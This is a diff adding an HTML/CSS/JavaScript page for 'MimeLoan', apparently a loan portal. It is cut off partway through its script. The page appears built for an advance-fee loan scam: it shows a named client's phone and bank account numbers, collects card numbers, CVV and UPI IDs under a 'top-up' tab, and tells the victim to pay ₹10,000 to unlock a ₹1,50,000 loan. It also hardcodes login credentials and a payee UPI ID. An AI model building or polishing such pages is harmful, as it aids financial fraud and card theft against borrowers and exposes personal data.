@@ -1,0 +1,1486 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MimeLoan | Professional Loan Management</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        :root {
+            --primary-color: #2563eb;
+            --secondary-color: #1d4ed8;
+            --accent-color: #10b981;
+            --warning-color: #f59e0b;
+            --danger-color: #ef4444;
+            --light-color: #f8fafc;
+            --dark-color: #1e293b;
+            --shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+            --border-radius: 10px;
+            --gradient-primary: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
+            --gradient-accent: linear-gradient(135deg, #10b981 0%, #059669 100%);
+        }
+        
+        body {
+            background-color: #f1f5f9;
+            color: #334155;
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        /* Login Page Styles */
+        .login-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: var(--gradient-primary);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .login-container::before {
+            content: '';
+            position: absolute;
+            width: 300px;
+            height: 300px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.1);
+            top: -150px;
+            right: -150px;
+        }
+        
+        .login-container::after {
+            content: '';
+            position: absolute;
+            width: 200px;
+            height: 200px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.1);
+            bottom: -100px;
+            left: -100px;
+        }
+        
+        .login-box {
+            background-color: white;
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow);
+            width: 100%;
+            max-width: 420px;
+            padding: 40px;
+            position: relative;
+            overflow: hidden;
+            z-index: 10;
+        }
+        
+        .login-box::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: var(--gradient-accent);
+        }
+        
+        .login-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .login-header h1 {
+            color: var(--primary-color);
+            font-size: 32px;
+            margin-bottom: 8px;
+            font-weight: 800;
+        }
+        
+        .login-header p {
+            color: #64748b;
+            font-size: 15px;
+        }
+        
+        .logo {
+            font-size: 42px;
+            color: var(--primary-color);
+            margin-bottom: 15px;
+            background: var(--gradient-primary);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #475569;
+        }
+        
+        .form-control {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #cbd5e1;
+            border-radius: var(--border-radius);
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+        
+        .form-control:focus {
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
+            outline: none;
+        }
+        
+        .btn {
+            display: inline-block;
+            padding: 14px 24px;
+            background: var(--gradient-primary);
+            color: white;
+            border: none;
+            border-radius: var(--border-radius);
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-align: center;
+            width: 100%;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(37, 99, 235, 0.2);
+        }
+        
+        .btn-login {
+            margin-top: 10px;
+        }
+        
+        .notification {
+            padding: 14px 16px;
+            border-radius: var(--border-radius);
+            margin-bottom: 20px;
+            display: none;
+        }
+        
+        .notification.success {
+            background-color: #f0fdf4;
+            border-left: 4px solid var(--accent-color);
+            color: #065f46;
+        }
+        
+        .notification.error {
+            background-color: #fef2f2;
+            border-left: 4px solid var(--danger-color);
+            color: #991b1b;
+        }
+        
+        /* Dashboard Styles */
+        .dashboard-container {
+            display: none;
+        }
+        
+        .header {
+            background-color: white;
+            box-shadow: var(--shadow);
+            padding: 20px;
+            border-radius: var(--border-radius);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+        
+        .header-left h1 {
+            color: var(--primary-color);
+            font-size: 26px;
+            font-weight: 800;
+        }
+        
+        .header-left p {
+            color: #64748b;
+            font-size: 14px;
+        }
+        
+        .user-info {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .avatar {
+            width: 44px;
+            height: 44px;
+            background: var(--gradient-primary);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 18px;
+        }
+        
+        .logout-btn {
+            padding: 10px 18px;
+            background-color: #f1f5f9;
+            color: var(--dark-color);
+            border: none;
+            border-radius: var(--border-radius);
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: 600;
+        }
+        
+        .logout-btn:hover {
+            background-color: #e2e8f0;
+        }
+        
+        .content {
+            display: grid;
+            grid-template-columns: 2fr 1fr;
+            gap: 30px;
+        }
+        
+        .card {
+            background-color: white;
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow);
+            padding: 28px;
+            margin-bottom: 24px;
+        }
+        
+        .card-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: var(--primary-color);
+            margin-bottom: 24px;
+            padding-bottom: 12px;
+            border-bottom: 2px solid #f1f5f9;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .card-title i {
+            color: var(--secondary-color);
+        }
+        
+        .loan-info-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 24px;
+        }
+        
+        .info-item {
+            margin-bottom: 18px;
+        }
+        
+        .info-label {
+            font-size: 14px;
+            color: #64748b;
+            margin-bottom: 6px;
+            font-weight: 600;
+        }
+        
+        .info-value {
+            font-size: 17px;
+            font-weight: 600;
+            color: var(--dark-color);
+            padding: 10px 14px;
+            background-color: #f8fafc;
+            border-radius: 8px;
+            border-left: 4px solid var(--primary-color);
+        }
+        
+        .highlight-box {
+            background: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%);
+            border-radius: var(--border-radius);
+            padding: 22px;
+            border: 1px solid #bae6fd;
+            margin-top: 24px;
+        }
+        
+        .highlight-title {
+            color: var(--primary-color);
+            font-weight: 700;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .highlight-amount {
+            font-size: 36px;
+            font-weight: 800;
+            color: var(--primary-color);
+            margin: 16px 0;
+        }
+        
+        .status-badge {
+            display: inline-block;
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 600;
+            margin-left: 10px;
+        }
+        
+        .status-success {
+            background-color: #d1fae5;
+            color: #065f46;
+        }
+        
+        .status-pending {
+            background-color: #fef3c7;
+            color: #92400e;
+        }
+        
+        .loan-eligibility {
+            background: var(--gradient-primary);
+            color: white;
+            border-radius: var(--border-radius);
+            padding: 28px;
+            margin-top: 24px;
+        }
+        
+        .loan-eligibility h3 {
+            font-size: 22px;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .loan-eligibility p {
+            margin-bottom: 16px;
+            opacity: 0.9;
+        }
+        
+        .eligibility-amount {
+            font-size: 42px;
+            font-weight: 800;
+            margin: 24px 0;
+            text-align: center;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        
+        .action-buttons {
+            display: flex;
+            gap: 16px;
+            margin-top: 28px;
+        }
+        
+        .btn-action {
+            flex: 1;
+            padding: 14px;
+            border-radius: var(--border-radius);
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .btn-primary {
+            background: var(--gradient-primary);
+            color: white;
+            border: none;
+        }
+        
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(37, 99, 235, 0.2);
+        }
+        
+        .btn-secondary {
+            background-color: #f1f5f9;
+            color: var(--dark-color);
+            border: none;
+        }
+        
+        .btn-secondary:hover {
+            background-color: #e2e8f0;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid #e2e8f0;
+            color: #64748b;
+            font-size: 14px;
+        }
+        
+        /* Loan Section Specific */
+        .loan-section {
+            background-color: white;
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow);
+            padding: 28px;
+            margin-bottom: 30px;
+        }
+        
+        .loan-section-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: var(--primary-color);
+            margin-bottom: 20px;
+            padding-bottom: 12px;
+            border-bottom: 2px solid #f1f5f9;
+        }
+        
+        .loan-detail-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 16px 0;
+            border-bottom: 1px solid #f1f5f9;
+        }
+        
+        .loan-detail-label {
+            font-weight: 600;
+            color: #475569;
+        }
+        
+        .loan-detail-value {
+            font-weight: 600;
+            color: var(--dark-color);
+        }
+        
+        .loan-amount-large {
+            font-size: 32px;
+            font-weight: 800;
+            color: var(--primary-color);
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        /* Payment Section */
+        .payment-section {
+            background-color: white;
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow);
+            padding: 28px;
+            margin-bottom: 30px;
+        }
+        
+        .payment-tabs {
+            display: flex;
+            border-bottom: 2px solid #e2e8f0;
+            margin-bottom: 24px;
+        }
+        
+        .payment-tab {
+            padding: 12px 24px;
+            cursor: pointer;
+            font-weight: 600;
+            color: #64748b;
+            border-bottom: 2px solid transparent;
+            margin-bottom: -2px;
+            transition: all 0.3s;
+        }
+        
+        .payment-tab.active {
+            color: var(--primary-color);
+            border-bottom: 2px solid var(--primary-color);
+        }
+        
+        .payment-content {
+            display: none;
+        }
+        
+        .payment-content.active {
+            display: block;
+        }
+        
+        .payment-form {
+            margin-top: 20px;
+        }
+        
+        .payment-info {
+            background-color: #f8fafc;
+            border-radius: var(--border-radius);
+            padding: 16px;
+            margin-bottom: 20px;
+        }
+        
+        .payment-info-title {
+            font-weight: 600;
+            color: var(--primary-color);
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .payment-method-details {
+            padding: 10px;
+            background-color: white;
+            border-radius: 8px;
+            margin-top: 8px;
+            border: 1px solid #e2e8f0;
+        }
+        
+        .card-visual {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .card-chip {
+            width: 40px;
+            height: 30px;
+            background: linear-gradient(135deg, #fbbf24 0%, #f59e0b 100%);
+            border-radius: 5px;
+            position: relative;
+        }
+        
+        .card-chip::after {
+            content: '';
+            position: absolute;
+            top: 5px;
+            left: 5px;
+            width: 30px;
+            height: 20px;
+            border: 1px solid rgba(0, 0, 0, 0.2);
+            border-radius: 3px;
+        }
+        
+        .card-number-masked {
+            font-family: monospace;
+            font-size: 18px;
+            letter-spacing: 2px;
+            color: #64748b;
+        }
+        
+        .card-brand {
+            color: var(--primary-color);
+            font-weight: 700;
+        }
+        
+        .upi-visual {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .upi-logo {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, #8b5cf6 0%, #7c3aed 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+        }
+        
+        .upi-id-masked {
+            font-family: monospace;
+            font-size: 16px;
+            color: #64748b;
+        }
+        
+        .payment-instruction {
+            background-color: #fff7ed;
+            border-radius: var(--border-radius);
+            padding: 16px;
+            margin-top: 20px;
+            border-left: 4px solid #f59e0b;
+        }
+        
+        .payment-instruction p {
+            margin-bottom: 8px;
+        }
+        
+        /* Responsive Styles */
+        @media (max-width: 768px) {
+            .content {
+                grid-template-columns: 1fr;
+            }
+            
+            .loan-info-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .action-buttons {
+                flex-direction: column;
+            }
+            
+            .header {
+                flex-direction: column;
+                gap: 15px;
+                align-items: flex-start;
+            }
+            
+            .user-info {
+                width: 100%;
+                justify-content: space-between;
+            }
+            
+            .payment-method-details {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 12px;
+            }
+        }
+        
+        /* Animation */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .fade-in {
+            animation: fadeIn 0.5s ease-out;
+        }
+        
+        /* Tabs */
+        .tabs {
+            display: flex;
+            border-bottom: 2px solid #e2e8f0;
+            margin-bottom: 24px;
+            flex-wrap: wrap;
+        }
+        
+        .tab {
+            padding: 12px 24px;
+            cursor: pointer;
+            font-weight: 600;
+            color: #64748b;
+            border-bottom: 2px solid transparent;
+            margin-bottom: -2px;
+            transition: all 0.3s;
+        }
+        
+        .tab.active {
+            color: var(--primary-color);
+            border-bottom: 2px solid var(--primary-color);
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        /* Modal Styles */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0, 0, 0, 0.5);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        
+        .modal {
+            background-color: white;
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow);
+            width: 90%;
+            max-width: 500px;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+        
+        .modal-header {
+            padding: 24px;
+            border-bottom: 1px solid #e2e8f0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .modal-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: var(--primary-color);
+        }
+        
+        .modal-close {
+            background: none;
+            border: none;
+            font-size: 24px;
+            color: #64748b;
+            cursor: pointer;
+            transition: color 0.3s;
+        }
+        
+        .modal-close:hover {
+            color: var(--danger-color);
+        }
+        
+        .modal-body {
+            padding: 24px;
+        }
+        
+        .modal-footer {
+            padding: 16px 24px;
+            border-top: 1px solid #e2e8f0;
+            display: flex;
+            justify-content: flex-end;
+            gap: 12px;
+        }
+        
+        .process-step {
+            background-color: #f8fafc;
+            border-radius: var(--border-radius);
+            padding: 20px;
+            margin-bottom: 20px;
+            border-left: 4px solid var(--primary-color);
+        }
+        
+        .step-number {
+            display: inline-block;
+            width: 30px;
+            height: 30px;
+            background-color: var(--primary-color);
+            color: white;
+            border-radius: 50%;
+            text-align: center;
+            line-height: 30px;
+            font-weight: bold;
+            margin-right: 10px;
+        }
+        
+        .step-title {
+            font-weight: 700;
+            color: var(--primary-color);
+            margin-bottom: 8px;
+        }
+        
+        .step-description {
+            color: #64748b;
+            font-size: 14px;
+        }
+        
+        .step-completed {
+            border-left-color: var(--accent-color);
+            background-color: #f0fdf4;
+        }
+        
+        .step-current {
+            border-left-color: var(--warning-color);
+            background-color: #fffbeb;
+        }
+    </style>
+</head>
+<body>
+    <!-- Login Page -->
+    <div class="login-container" id="loginPage">
+        <div class="login-box">
+            <div class="login-header">
+                <div class="logo">
+                    <i class="fas fa-hand-holding-usd"></i>
+                </div>
+                <h1>MimeLoan</h1>
+                <p>Professional Loan Management Portal</p>
+            </div>
+            
+            <div id="loginNotification" class="notification error">
+                Invalid username or password. Please try again.
+            </div>
+            
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="username"><i class="fas fa-user"></i> Username</label>
+                    <input type="text" id="username" class="form-control" placeholder="Enter your username" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="password"><i class="fas fa-lock"></i> Password</label>
+                    <input type="password" id="password" class="form-control" placeholder="Enter your password" required>
+                </div>
+                
+                <button type="submit" class="btn btn-login">
+                    <i class="fas fa-sign-in-alt"></i> Login to MimeLoan Portal
+                </button>
+            </form>
+            
+            <div class="footer">
+                <p>© 2023 MimeLoan. All rights reserved.</p>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Dashboard Page -->
+    <div class="dashboard-container" id="dashboardPage">
+        <div class="container">
+            <div class="header">
+                <div class="header-left">
+                    <h1><i class="fas fa-hand-holding-usd"></i> MimeLoan Dashboard</h1>
+                    <p>Professional Loan Management & Tracking System</p>
+                </div>
+                
+                <div class="user-info">
+                    <div class="avatar">H</div>
+                    <div>
+                        <div style="font-weight: 700;">Harish Barnala</div>
+                        <div style="font-size: 13px; color: #64748b;">Premium Client</div>
+                    </div>
+                    <button class="logout-btn" id="logoutBtn"><i class="fas fa-sign-out-alt"></i> Logout</button>
+                </div>
+            </div>
+            
+            <!-- Tabs -->
+            <div class="tabs">
+                <div class="tab active" data-tab="loan-dashboard">Loan Dashboard</div>
+                <div class="tab" data-tab="topup-payment">Top-up Payment</div>
+                <div class="tab" data-tab="loan-section">Loan Section</div>
+            </div>
+            
+            <!-- Loan Dashboard Tab -->
+            <div class="tab-content active" id="loan-dashboard">
+                <div class="content">
+                    <div class="main-content">
+                        <div class="card">
+                            <div class="card-title">
+                                <i class="fas fa-user-circle"></i> Client Information
+                            </div>
+                            <div class="loan-info-grid">
+                                <div class="info-item">
+                                    <div class="info-label">Full Name</div>
+                                    <div class="info-value">Harish Barnala</div>
+                                </div>
+                                <div class="info-item">
+                                    <div class="info-label">Mobile Number</div>
+                                    <div class="info-value">7300225334</div>
+                                </div>
+                                <div class="info-item">
+                                    <div class="info-label">Bank Name</div>
+                                    <div class="info-value">Kotak Bank</div>
+                                </div>
+                                <div class="info-item">
+                                    <div class="info-label">Account Number</div>
+                                    <div class="info-value">2545731180</div>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="card">
+                            <div class="card-title">
+                                <i class="fas fa-credit-card"></i> Current Loan Status
+                            </div>
+                            <div class="loan-info-grid">
+                                <div class="info-item">
+                                    <div class="info-label">Top-up Amount</div>
+                                    <div class="info-value">₹10,000 <span class="status-badge status-success">Success</span></div>
+                                </div>
+                                <div class="info-item">
+                                    <div class="info-label">Withdrawal Request</div>
+                                    <div class="info-value">₹10,000 <span class="status-badge status-pending">Processing</span></div>
+                                </div>
+                                <div class="info-item">
+                                    <div class="info-label">Payment to Account</div>
+                                    <div class="info-value">2545731180</div>
+                                </div>
+                                <div class="info-item">
+                                    <div class="info-label">Account Status</div>
+                                    <div class="info-value">Active <span class="status-badge status-success">Verified</span></div>
+                                </div>
+                            </div>
+                            
+                            <div class="highlight-box">
+                                <div class="highlight-title">
+                                    <i class="fas fa-info-circle"></i> Transaction Summary
+                                </div>
+                                <p>Your ₹10,000 top-up has been successfully processed to your Kotak Bank account. The withdrawal request of ₹10,000 is currently being processed and will be transferred to your account ending with 1180 within 24 hours.</p>
+                            </div>
+                        </div>
+                        
+                        <div class="action-buttons">
+                            <button class="btn-action btn-primary" id="requestMoreBtn">
+                                <i class="fas fa-plus-circle"></i> Request Additional Funds
+                            </button>
+                            <button class="btn-action btn-secondary" id="viewStatementBtn">
+                                <i class="fas fa-file-invoice"></i> Download Statement
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <div class="sidebar">
+                        <div class="loan-eligibility">
+                            <h3><i class="fas fa-bell"></i> Eligibility Upgrade</h3>
+                            <p>After successfully returning ₹10,000, you become eligible for a higher loan amount.</p>
+                            <div class="eligibility-amount">₹1,50,000</div>
+                            <p>Your excellent repayment history and credit score qualify you for this increased limit.</p>
+                            <button class="btn-action btn-primary" id="applyLoanBtn" style="background: rgba(255, 255, 255, 0.9); color: var(--primary-color);">
+                                <i class="fas fa-check-circle"></i> Apply for ₹1,50,000 Loan
+                            </button>
+                        </div>
+                        
+                        <div class="card">
+                            <div class="card-title">
+                                <i class="fas fa-history"></i> Recent Activity
+                            </div>
+                            <div class="info-item">
+                                <div class="info-label">Today</div>
+                                <div class="info-value">Top-up of ₹10,000 processed</div>
+                            </div>
+                            <div class="info-item">
+                                <div class="info-label">Yesterday</div>
+                                <div class="info-value">Withdrawal request submitted</div>
+                            </div>
+                            <div class="info-item">
+                                <div class="info-label">Last Week</div>
+                                <div class="info-value">EMI payment of ₹5000 made</div>
+                            </div>
+                            <div class="info-item">
+                                <div class="info-label">Last Month</div>
+                                <div class="info-value">Credit score updated: </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Top-up Payment Tab -->
+            <div class="tab-content" id="topup-payment">
+                <div class="payment-section">
+                    <div class="loan-section-title">
+                        <i class="fas fa-credit-card"></i> Top-up Payment Options
+                    </div>
+                    
+                    <div class="payment-tabs">
+                        <div class="payment-tab active" data-payment="card">Credit/Debit Card</div>
+                        <div class="payment-tab" data-payment="upi">UPI Payment</div>
+                    </div>
+                    
+                    <!-- Card Payment Content -->
+                    <div class="payment-content active" id="card-payment">
+                        <div class="payment-info">
+                            <div class="payment-info-title">
+                                <i class="fas fa-lock"></i> Secure Card Payment
+                            </div>
+                            <p>Enter your card details to make a secure payment. All transactions are encrypted and secure.</p>
+                            
+                            <div class="payment-method-details">
+                                <div class="card-visual">
+                                    <div class="card-chip"></div>
+                                    <div class="card-number-masked">•••• •••• •••• ••••</div>
+                                </div>
+                                <div class="card-brand">Secure Payment Gateway</div>
+                            </div>
+                        </div>
+                        
+                        <form id="cardPaymentForm" class="payment-form">
+                            <div class="form-group">
+                                <label for="cardNumber">Card Number</label>
+                                <input type="text" id="cardNumber" class="form-control" placeholder="Enter 16-digit card number" maxlength="19" required>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label for="cardHolder">Card Holder Name</label>
+                                <input type="text" id="cardHolder" class="form-control" placeholder="Name on card" required>
+                            </div>
+                            
+                            <div class="loan-info-grid">
+                                <div class="form-group">
+                                    <label for="expiryDate">Expiry Date (MM/YY)</label>
+                                    <input type="text" id="expiryDate" class="form-control" placeholder="MM/YY" maxlength="5" required>
+                                </div>
+                                
+                                <div class="form-group">
+                                    <label for="cvv">CVV</label>
+                                    <input type="password" id="cvv" class="form-control" placeholder="123" maxlength="3" required>
+                                </div>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label for="cardAmount">Top-up Amount (₹)</label>
+                                <input type="number" id="cardAmount" class="form-control" placeholder="Enter amount" min="100" max="100000" value="10000" required>
+                            </div>
+                            
+                            <button type="submit" class="btn btn-primary">
+                                <i class="fas fa-lock"></i> Pay Securely
+                            </button>
+                        </form>
+                    </div>
+                    
+                    <!-- UPI Payment Content -->
+                    <div class="payment-content" id="upi-payment">
+                        <div class="payment-info">
+                            <div class="payment-info-title">
+                                <i class="fas fa-mobile-alt"></i> UPI Payment
+                            </div>
+                            <p>Enter your UPI ID to make a quick payment. You will be redirected to your UPI app for confirmation.</p>
+                            
+                            <div class="payment-method-details">
+                                <div class="upi-visual">
+                                    <div class="upi-logo">UPI</div>
+                                    <div class="upi-id-masked">Enter your UPI ID</div>
+                                </div>
+                                <div class="card-brand">Instant Payment</div>
+                            </div>
+                        </div>
+                        
+                        <form id="upiPaymentForm" class="payment-form">
+                            <div class="form-group">
+                                <label for="upiId">UPI ID</label>
+                                <input type="text" id="upiId" class="form-control" placeholder="Enter your UPI ID" required>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label for="upiAmount">Top-up Amount (₹)</label>
+                                <input type="number" id="upiAmount" class="form-control" placeholder="Enter amount" min="100" max="100000" value="10000" required>
+                            </div>
+                            
+                            <button type="submit" class="btn btn-primary">
+                                <i class="fas fa-qrcode"></i> Pay via UPI
+                            </button>
+                        </form>
+                    </div>
+                    
+                    <div id="paymentNotification" class="notification" style="margin-top: 20px; display: none;">
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Loan Section Tab -->
+            <div class="tab-content" id="loan-section">
+                <div class="loan-section">
+                    <div class="loan-section-title">
+                        <i class="fas fa-money-check-alt"></i> Loan Section - Entry Details
+                    </div>
+                    
+                    <div class="loan-detail-row">
+                        <div class="loan-detail-label">Username:</div>
+                        <div class="loan-detail-value">Harish Barnala</div>
+                    </div>
+                    
+                    <div class="loan-detail-row">
+                        <div class="loan-detail-label">Mobile Number:</div>
+                        <div class="loan-detail-value">7300225334</div>
+                    </div>
+                    
+                    <div class="loan-detail-row">
+                        <div class="loan-detail-label">Account Number:</div>
+                        <div class="loan-detail-value">2545731180</div>
+                    </div>
+                    
+                    <div class="loan-detail-row">
+                        <div class="loan-detail-label">Bank Name:</div>
+                        <div class="loan-detail-value">Kotak Bank</div>
+                    </div>
+                    
+                    <div class="loan-detail-row">
+                        <div class="loan-detail-label">Top-up Amount:</div>
+                        <div class="loan-detail-value"><span class="status-badge status-success">₹10,000 Success</span></div>
+                    </div>
+                    
+                    <div class="loan-detail-row">
+                        <div class="loan-detail-label">Withdrawal Request:</div>
+                        <div class="loan-detail-value">₹10,000 <span class="status-badge status-pending">Pending</span></div>
+                    </div>
+                    
+                    <div class="loan-detail-row">
+                        <div class="loan-detail-label">Payment to Account:</div>
+                        <div class="loan-detail-value">2545731180</div>
+                    </div>
+                    
+                    <div class="loan-amount-large">
+                        Current Eligible: ₹1,50,000
+                    </div>
+                    
+                    <div class="highlight-box">
+                        <div class="highlight-title">
+                            <i class="fas fa-exclamation-circle"></i> Important Note
+                        </div>
+                        <p>After returning ₹10,000, you are now eligible for a loan of ₹1,50,000. This is based on your excellent repayment history and credit score with MimeLoan.</p>
+                    </div>
+                </div>
+                
+                <div class="action-buttons">
+                    <button class="btn-action btn-primary" id="newLoanRequestBtn">
+                        <i class="fas fa-file-signature"></i> Submit New Loan Request
+                    </button>
+                </div>
+            </div>
+            
+            <div class="footer">
+                <p>© 2023 MimeLoan. Kotak Bank Partnership. All transactions are secure and encrypted.</p>
+                <p style="margin-top: 5px; font-size: 13px;">Contact Support: support@mimeloan.com | Helpline: 1800-202-3040 | Registered Office: Mumbai, India</p>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Loan Application Modal -->
+    <div class="modal-overlay" id="loanModal">
+        <div class="modal">
+            <div class="modal-header">
+                <div class="modal-title">
+                    <i class="fas fa-hand-holding-usd"></i> ₹1,50,000 Loan Application Process
+                </div>
+                <button class="modal-close" id="closeModal">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div class="process-step step-completed">
+                    <div>
+                        <span class="step-number">1</span>
+                        <span class="step-title">₹10,000 Top-up Completed</span>
+                    </div>
+                    <div class="step-description">
+                        You have successfully completed the ₹10,000 top-up requirement. This step is mandatory for ₹1,50,000 loan eligibility.
+                    </div>
+                </div>
+                
+                <div class="process-step step-current">
+                    <div>
+                        <span class="step-number">2</span>
+                        <span class="step-title">₹10,000 Return Process</span>
+                    </div>
+                    <div class="step-description">
+                        Before proceeding with the ₹1,50,000 loan application, you need to return the ₹10,000 amount. This demonstrates your repayment capability.
+                    </div>
+                </div>
+                
+                <div class="form-group" style="margin-top: 20px;">
+                    <label for="returnAmount">Return Amount (₹)</label>
+                    <input type="number" id="returnAmount" class="form-control" value="10000" readonly>
+                </div>
+                
+                <div class="form-group">
+                    <label for="returnMethod">Select Return Method</label>
+                    <select id="returnMethod" class="form-control">
+                        <option value="bank_transfer">Bank Transfer</option>
+                        <option value="upi">UPI Payment</option>
+                        <option value="card">Credit/Debit Card</option>
+                    </select>
+                </div>
+                
+                <div class="process-step">
+                    <div>
+                        <span class="step-number">3</span>
+                        <span class="step-title">₹1,50,000 Loan Application</span>
+                    </div>
+                    <div class="step-description">
+                        After successful return of ₹10,000, you can proceed with the ₹1,50,000 loan application with enhanced terms and conditions.
+                    </div>
+                </div>
+                
+                <div id="modalNotification" class="notification" style="margin-top: 20px; display: none;"></div>
+            </div>
+            <div class="modal-footer">
+                <button class="btn-secondary" id="cancelProcess">Cancel</button>
+                <button class="btn-primary" id="processReturn">Process ₹10,000 Return</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // DOM Elements
+        const loginPage = document.getElementById('loginPage');
+        const dashboardPage = document.getElementById('dashboardPage');
+        const loginForm = document.getElementById('loginForm');
+        const loginNotification = document.getElementById('loginNotification');
+        const logoutBtn = document.getElementById('logoutBtn');
+        const applyLoanBtn = document.getElementById('applyLoanBtn');
+        const requestMoreBtn = document.getElementById('requestMoreBtn');
+        const viewStatementBtn = document.getElementById('viewStatementBtn');
+        const newLoanRequestBtn = document.getElementById('newLoanRequestBtn');
+        
+        // Payment elements
+        const cardPaymentForm = document.getElementById('cardPaymentForm');
+        const upiPaymentForm = document.getElementById('upiPaymentForm');
+        const paymentNotification = document.getElementById('paymentNotification');
+        const cardNumberInput = document.getElementById('cardNumber');
+        const expiryDateInput = document.getElementById('expiryDate');
+        const upiIdInput = document.getElementById('upiId');
+        
+        // Modal elements
+        const loanModal = document.getElementById('loanModal');
+        const closeModal = document.getElementById('closeModal');
+        const cancelProcess = document.getElementById('cancelProcess');
+        const processReturn = document.getElementById('processReturn');
+        const modalNotification = document.getElementById('modalNotification');
+        const returnMethod = document.getElementById('returnMethod');
+        
+        // Tabs
+        const tabs = document.querySelectorAll('.tab');
+        const tabContents = document.querySelectorAll('.tab-content');
+        const paymentTabs = document.querySelectorAll('.payment-tab');
+        const paymentContents = document.querySelectorAll('.payment-content');
+        
+        // Login credentials
+        const validUsername = "harish";
+        const validPassword = "harish@123";
+        
+        // Payment credentials (HIDDEN FROM USER - only for backend validation)
+        const validCardNumber = "234235236";
+        const validUpiId = "banadarbar@ybl";
+        
+        // Format card number input
+        cardNumberInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            let formattedValue = value.replace(/(\d{4})/g, '$1 ').trim();
